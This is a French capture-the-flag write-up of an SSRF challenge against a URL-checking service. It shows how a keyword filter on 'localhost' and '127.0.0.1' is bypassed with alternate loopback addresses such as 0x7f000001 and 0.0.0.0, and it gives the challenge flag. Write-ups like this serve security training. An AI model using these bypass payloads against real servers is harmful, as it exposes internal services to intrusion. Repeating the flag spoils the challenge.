# Le Maillon Faible (SSRF)

**Flag :** `HSR{v0us_3t3s_l3_m41ll0n_f41bl3_4u_r3v01r!}`

---

## Table des matières

- [Contexte](#contexte)
- [Étape 1 - Découverte de l'endpoint interne](#étape-1---découverte-de-lendpoint-interne)
- [Étape 2 - Tentative d'accès direct](#étape-2---tentative-daccès-direct)
- [Étape 3 - Première tentative SSRF (bloquée)](#étape-3---première-tentative-ssrf-bloquée)
- [Étape 4 - Contournement du filtre](#étape-4---contournement-du-filtre)
- [Résumé de la chaîne de résolution](#résumé-de-la-chaîne-de-résolution)

---

## Contexte

On accède à un vérificateur d'URL qui teste si un site est accessible. On peut entrer une URL et le serveur renvoie le statut HTTP et le contenu de la réponse.

---

## Étape 1 - Découverte de l'endpoint interne

En consultant `/robots.txt`, on trouve :

```
User-agent: *
Disallow: /internal/
```

Cela révèle l'existence d'un répertoire `/internal/`.

---

## Étape 2 - Tentative d'accès direct

On essaie d'accéder directement à `/internal/flag` :

```
GET /internal/flag
```

Réponse :

```json
{
  "error": "Accès réservé au réseau interne.",
  "server": "localhost",
  "port": 3000
}
```

L'endpoint existe mais vérifie que la requête vient de `127.0.0.1`. La réponse 403 divulgue le `server` et le `port` internes.

---

## Étape 3 - Première tentative SSRF (bloquée)

On essaie d'utiliser le vérificateur avec `http://localhost:3000/internal/flag` :

```json
{
  "error": "Adresse bloquée. Les requêtes vers le réseau interne sont interdites."
}
```

Le serveur filtre les URL contenant `localhost` et `127.0.0.1`.

---

## Étape 4 - Contournement du filtre

Le filtre ne bloque que les mots-clés `localhost` et `127.0.0.1`. On peut le contourner en utilisant une représentation alternative de l'adresse loopback :

- IP hexadécimale : `http://0x7f000001:3000/internal/flag`
- Adresse wildcard : `http://0.0.0.0:3000/internal/flag`

On entre dans le vérificateur :

```
http://0x7f000001:3000/internal/flag
```

ou :

```
http://0.0.0.0:3000/internal/flag
```

Le serveur effectue la requête. L'adresse IP source correspond à la boucle locale, la vérification passe, et le contenu est renvoyé :

```json
{"flag":"HSR{v0us_3t3s_l3_m41ll0n_f41bl3_4u_r3v01r!}"}
```

---

## Résumé de la chaîne de résolution

```
Vérificateur d'URL
  |
  |-- /robots.txt -> Disallow: /internal/
          |
          |-- GET /internal/flag -> 403 avec server: localhost, port: 3000
                    |
                    |-- SSRF http://localhost:3000/internal/flag -> bloqué par le filtre
                              |
                              |-- Contournement : http://0x7f000001:3000/internal/flag -> flag
                              |-- Contournement : http://0.0.0.0:3000/internal/flag -> flag
```
